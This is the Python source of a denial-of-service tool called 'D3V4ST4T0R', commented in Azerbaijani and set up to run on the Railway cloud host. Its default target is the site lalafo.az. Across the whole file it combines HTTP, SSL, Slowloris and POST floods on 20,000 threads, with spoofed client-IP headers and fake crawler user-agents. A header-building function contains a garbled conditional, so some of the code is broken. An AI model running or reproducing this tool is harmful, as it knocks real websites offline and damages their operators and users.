#!/usr/bin/env python3
"""
D3V4ST4T0R v4.0 - RAILWAY EDITION
Railway server üçün optimallaşdırılmış versiya
"""
import socket, ssl, threading, random, string, time, sys, json, os

# === KONFİQ ===
HEDEF = os.environ.get("TARGET", "lalafo.az")
PORT = int(os.environ.get("PORT", 443))
USE_SSL = os.environ.get("SSL", "true").lower() == "true"
THREAD_COUNT = int(os.environ.get("THREADS", 20000))
MUDDET = int(os.environ.get("DURATION", 999999))

# === User-Agent ===
UA_POOL = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36"
    for v in range(120, 135)
] + [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
    for v in [120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130]
] + [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 Chrome/130.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 Chrome/129.0.6668.100 Mobile Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

def rand_str(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def resolve(hostname):
    ips = []
    try:
        ips.append(socket.gethostbyname(hostname))
        print(f"  [+] DNS resolve: {hostname} -> {ips[0]}")
        # Əlavə DNS məlumatı
        for info in socket.getaddrinfo(hostname, 80, socket.AF_INET, socket.SOCK_STREAM):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
        print(f"  [+] Cəmi {len(ips)} IP tapıldı: {', '.join(ips[:5])}")
    except Exception as e:
        print(f"  [!] DNS error: {e}")
    return ips

def gen_headers(host):
    return (
        f"User-Agent: {random.choice(UA_POOL)}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Accept-Language: {random.choice(['en-US,en;q=0.9','tr-TR,tr;q=0.8,en;q=0.5','az-Latn-AZ,az;q=0.9,en;q=0.5','ru-RU,ru;q=0.9,en;q=0.5'])}\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        f"Pragma: no-cache\r\n"
        f"Connection: keep-alive\r\n"
        f"Upgrade-Insecure-Requests: 1\r\n"
        f"X-Forwarded-For: {rand_ip()}\r\n"
        f"X-Real-IP: {rand_ip()}\r\n"
        f"CF-Connecting-IP: {rand_ip()}\r\n"
        f"True-Client-IP: {rand_ip()}\r\n"
        f"X-Request-ID: {hashlib.md5(rand_str(20).encode()).hexdigest()[:16]}\r\n"
        if False else ""  # hashlib import etməmək üçün
        f"From: user{random.randint(1,99999)}@example.com\r\n"
    )

# Metod 1: HTTP Flood
def http_flood(ip, port, ssl_mode, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        if ssl_mode:
            ctx = ssl._create_unverified_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers('ALL:@SECLEVEL=0')
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((ip, port))
        path = random.choice([
            "/", f"/{rand_str()}", f"/api/v1/{rand_str()}", f"/search?q={rand_str()}",
            f"/?nocache={random.randint(100000,999999)}",
            f"/wp-content/themes/{rand_str()}/{rand_str()}.php?ver={random.randint(1,9)}.{random.randint(1,9)}"
        ])
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{gen_headers(host)}"
            f"\r\n"
        )
        sock.send(req.encode())
        try: sock.recv(1024)
        except: pass
        sock.close()
    except: pass

# Metod 2: SSL Flood
def ssl_flood(ip, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, 443))
        ctx = ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers('ALL:@SECLEVEL=0')
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        ssock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        try: ssock.recv(512)
        except: pass
        ssock.close()
    except: pass

# Metod 3: Slowloris
def slowloris(ip, port, ssl_mode, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        if ssl_mode:
            ctx = ssl._create_unverified_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((ip, port))
        sock.send(f"GET /{rand_str()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UA_POOL)}\r\n".encode())
        start = time.time()
        while time.time() - start < 20:
            try:
                sock.send(f"X-{rand_str()}: {rand_str()}\r\n".encode())
                time.sleep(random.uniform(2, 6))
            except: break
        sock.close()
    except: pass

# Metod 4: POST Flood (böyük payload)
def post_flood(ip, port, ssl_mode, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        if ssl_mode:
            ctx = ssl._create_unverified_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((ip, port))
        body = rand_str(random.randint(10000, 50000))
        req = (
            f"POST /api/{rand_str()}/{rand_str()} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{gen_headers(host)}"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )
        sock.send(req.encode()[:2048])
        try: sock.recv(256)
        except: pass
        sock.close()
    except: pass

# Worker thread
stop_flag = threading.Event()
request_count = 0
count_lock = threading.Lock()

def worker(ip, port, ssl_mode, host, wid):
    methods = [http_flood, ssl_flood, slowloris, post_flood, http_flood, http_flood]
    while not stop_flag.is_set():
        m = random.choice(methods)
        try:
            m(ip, port, ssl_mode, host)
            with count_lock:
                global request_count
                request_count += 1
        except: pass
        time.sleep(random.uniform(0.0001, 0.0005))

# === RAILWAY HEALTH CHECK ENDPOINT ===
from http.server import HTTPServer, BaseHTTPRequestHandler

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        with count_lock:
            total = request_count
        self.wfile.write(json.dumps({
            "status": "running",
            "target": HEDEF,
            "threads": threading.active_count(),
            "uptime": f"{int(time.time() - start_time)}s",
            "requests": total,
        }).encode())
    def log_message(self, *args): pass

def start_health_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    print(f"  [+] Health check: http://0.0.0.0:8080")
    server.serve_forever()

# === MAIN ===
if __name__ == "__main__":
    global start_time
    start_time = time.time()
    
    print("="*50)
    print("D3V4ST4T0R v4.0 - RAILWAY EDITION")
    print("="*50)
    print(f"  Hedef: {HEDEF}")
    print(f"  Port: {PORT} {'(SSL)' if USE_SSL else '(HTTP)'}")
    print(f"  Thread: {THREAD_COUNT:,}")
    print()
    
    print("[*] DNS cozulur...")
    ips = resolve(HEDEF)
    if not ips:
        ips = [HEDEF]
    
    ip = ips[0]
    print(f"[*] Hucum baslayir: {ip}:{PORT}")
    print()
    
    # Thread-ləri başlat
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(ip, PORT, USE_SSL, HEDEF, i), daemon=True)
        t.start()
        if (i+1) % 2000 == 0:
            print(f"  [+] {i+1}/{THREAD_COUNT} thread...")
    
    print(f"\n[!] {THREAD_COUNT} THREAD ISHE SALINDI!")
    print(f"[!] Health check: http://localhost:8080 (Railway internal)")
    
    # Health server başlat
    threading.Thread(target=start_health_server, daemon=True).start()
    
    # Monitor
    try:
        while time.time() - start_time < MUDDET:
            with count_lock:
                rps = request_count / (time.time() - start_time + 0.1)
            print(f"\r  [+] {int(time.time()-start_time)}s | Threads: {threading.active_count():,} | RPS: {rps:,.0f} | Total: {request_count:,}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[!] Dayandirildi")
        stop_flag.set()
